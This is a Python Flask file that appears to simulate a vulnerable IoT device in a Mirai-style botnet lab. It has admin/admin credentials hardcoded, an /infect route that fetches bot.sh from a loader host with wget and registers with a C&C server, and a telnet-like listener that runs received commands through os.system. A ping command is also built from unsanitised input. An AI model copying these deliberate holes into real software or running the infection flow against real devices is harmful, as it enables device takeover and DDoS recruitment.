# iot_device.py
from flask import Flask, request, jsonify, Response
import os, socket, threading, requests

app = Flask(__name__)

USERNAME = "admin"
PASSWORD = "admin"
infected = False

# auth
@app.route("/")
def home():
    auth = request.authorization
    if not auth or auth.username != USERNAME or auth.password != PASSWORD:
        return Response("Unauthorized\n", 401, {"WWW-Authenticate": 'Basic realm="Login required"'})
    else:
        authorized = True
        return "Welcome! Valid credentials used.\n"


# get_file
@app.route("/infect", methods=["POST"])
def infect():
    global infected
    
    data= request.json
    
    auth_device = data.get("ip")
    auth_user = data.get("user")
    auth_pass = data.get("pass")
    
    if auth_user == USERNAME and auth_pass == PASSWORD:
    
        # ok, so now there is an "hardcoded" simulation of wget for the bot download from the loader
        cmd = "wget http://loader:5001/bot.sh -O /app/bot.sh"
        execute_command(cmd)
        
        if os.path.exists("/app/bot.sh"):
            infected = True
            print("Infected IoT device", flush = True)
            
            # Send to C&C server that the device has been infected --> ready for DDoS attack
            cnc_url = "http://cnc:5002/register"
            requests.post(cnc_url, json={"ip": auth_device})
            
            return jsonify({"status": "infected"})
        else:
            return jsonify({"status": "not infected"})
        
    else:
        return Response("Unauthorized\n", 401, {"WWW-Authenticate": 'Basic realm="Login required"'})


# TODO telnet
def handle_client(conn):
    try:
        conn.send(b"login: ")
        user = conn.recv(1024).strip().decode()
        
        conn.send(b"password: ")
        passwd = conn.recv(1024).strip().decode()
        
        if user != USERNAME or passwd != PASSWORD:
            conn.send(b"Login incorrect\n")
            conn.close()
            return
            
        while True:
            cmd = conn.recv(1024).decode().strip()
            if not cmd:
                break
                
            print(f"Command: {cmd}", flush = True)
            
            os.system(cmd)
            conn.send(b"$ ")
            
    except:
        pass
            
    conn.close()

def start_telnet():
    s = socket.socket()
    s.bind(("0.0.0.0", 2323))
    s.listen(5)
    
    print("Telnet running on port 2323")
    
    while True:
        conn, _ = s.accept()
        threading.Thread(target=handle_client, args=(conn,)).start()



# attack
@app.route("/attack", methods=["POST"])
def attack():
    target = request.json.get("target")
    print(f"Attacking {target}")
    cmd = f"ping -c 10 {target}"
    execute_command(cmd)
    return jsonify({"status": "attack simulated"})

# others
@app.route("/status", methods=["GET"])
def status():
    return { "infected": infected }
    
def execute_command(cmd):
    print(f"Executing: {cmd}", flush = True)
    os.system(cmd)
    
    
app.run(host="0.0.0.0", port=8000,debug=True)
